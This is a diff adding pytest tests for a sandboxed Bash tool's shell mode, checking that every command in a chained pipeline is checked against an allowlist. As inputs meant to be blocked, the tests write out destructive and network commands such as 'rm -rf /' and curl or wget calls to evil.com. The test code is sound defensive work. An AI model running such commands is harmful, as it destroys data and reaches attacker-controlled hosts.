@@ -564,3 +564,160 @@ class TestSymlinkSandboxProtection:
             working_directory=str(workspace),
         )
         assert result.success is True
+
+
+class TestShellModeCommandChaining:
+    """Tests for shell_mode command chaining validation.
+
+    Verifies that when shell_mode=True, ALL commands in a chained pipeline
+    are validated against the allowlist — not just the first command.
+    """
+
+    @pytest.fixture
+    def shell_tool(self, workspace):
+        """Create a Bash tool with shell_mode enabled."""
+        return Bash(config={
+            "workspace_root": str(workspace),
+            "shell_mode": True,
+        })
+
+    # --- Allowed commands still work ---
+
+    def test_single_allowed_command(self, shell_tool, workspace):
+        """Single allowed command works in shell mode."""
+        result = shell_tool.execute(command="ls", working_directory=str(workspace))
+        assert result.success is True
+
+    def test_pipe_between_allowed_commands(self, shell_tool, workspace):
+        """Pipe between two allowed commands works."""
+        (workspace / "test.txt").write_text("hello\nworld\n")
+        result = shell_tool.execute(
+            command="cat test.txt | cat",
+            working_directory=str(workspace),
+        )
+        assert result.success is True
+        assert "hello" in result.result
+
+    def test_semicolon_between_allowed_commands(self, shell_tool, workspace):
+        """Semicolon between two allowed commands works."""
+        result = shell_tool.execute(
+            command="pwd ; ls",
+            working_directory=str(workspace),
+        )
+        assert result.success is True
+
+    def test_and_chain_allowed_commands(self, shell_tool, workspace):
+        """&& between two allowed commands works."""
+        result = shell_tool.execute(
+            command="pwd && ls",
+            working_directory=str(workspace),
+        )
+        assert result.success is True
+
+    def test_or_chain_allowed_commands(self, shell_tool, workspace):
+        """|| between two allowed commands works."""
+        result = shell_tool.execute(
+            command="pwd || ls",
+            working_directory=str(workspace),
+        )
+        assert result.success is True
+
+    # --- Disallowed commands in pipeline are blocked ---
+
+    def test_pipe_to_disallowed_command_blocked(self, shell_tool, workspace):
+        """Pipe to a disallowed command is blocked."""
+        result = shell_tool.execute(
+            command="ls | rm -rf /",
+            working_directory=str(workspace),
+        )
+        assert result.success is False
+        assert "not in the allowed list" in result.error
+
+    def test_semicolon_to_disallowed_command_blocked(self, shell_tool, workspace):
+        """Semicolon to a disallowed command is blocked."""
+        result = shell_tool.execute(
+            command="ls ; rm -rf /",
+            working_directory=str(workspace),
+        )
+        assert result.success is False
+        assert "not in the allowed list" in result.error
+
+    def test_and_chain_to_disallowed_command_blocked(self, shell_tool, workspace):
+        """&& to a disallowed command is blocked."""
+        result = shell_tool.execute(
+            command="ls && curl http://evil.com",
+            working_directory=str(workspace),
+        )
+        assert result.success is False
+        assert "not in the allowed list" in result.error
+
+    def test_or_chain_to_disallowed_command_blocked(self, shell_tool, workspace):
+        """|| to a disallowed command is blocked."""
+        result = shell_tool.execute(
+            command="ls || wget http://evil.com",
+            working_directory=str(workspace),
+        )
+        assert result.success is False
+        assert "not in the allowed list" in result.error
+
+    def test_disallowed_first_in_pipe(self, shell_tool, workspace):
+        """Disallowed command as first in a pipeline is blocked."""
+        result = shell_tool.execute(
+            command="curl http://evil.com | cat",
+            working_directory=str(workspace),
+        )
+        assert result.success is False
+        assert "not in the allowed list" in result.error
+
+    def test_disallowed_middle_of_chain(self, shell_tool, workspace):
+        """Disallowed command in the middle of a chain is blocked."""
+        result = shell_tool.execute(
+            command="ls ; rm -rf / ; pwd",
+            working_directory=str(workspace),
+        )
+        assert result.success is False
+        assert "not in the allowed list" in result.error
+
+    # --- Command substitution blocked ---
+
+    def test_dollar_paren_substitution_blocked(self, shell_tool, workspace):
+        """$() command substitution is blocked."""
+        result = shell_tool.execute(
+            command="cat $(ls)",
+            working_directory=str(workspace),
+        )
+        assert result.success is False
+        assert "command substitution" in result.error.lower()
+
+    def test_backtick_substitution_blocked(self, shell_tool, workspace):
+        """Backtick command substitution is blocked."""
+        result = shell_tool.execute(
+            command="cat `ls`",
+            working_directory=str(workspace),
+        )
+        assert result.success is False
+        assert "command substitution" in result.error.lower()
+
+    # --- Path-based command names blocked ---
+
+    def test_path_command_in_pipeline_blocked(self, shell_tool, workspace):
+        """Path-based command name in pipeline is blocked."""
+        result = shell_tool.execute(
+            command="ls | /usr/bin/evil",
+            working_directory=str(workspace),
+        )
+        assert result.success is False
+        assert "bare name" in result.error.lower()
+
+    # --- Shell mode metadata ---
+
+    def test_shell_mode_description(self, shell_tool):
+        """Shell mode description mentions shell mode."""
+        metadata = shell_tool.get_metadata()
+        assert "shell mode" in metadata.description.lower()
+
+    def test_shell_mode_schema_description(self, shell_tool):
+        """Shell mode parameter description mentions redirections."""
+        schema = shell_tool.get_parameters_schema()
+        cmd_desc = schema["properties"]["command"]["description"]
+        assert "redirection" in cmd_desc.lower()
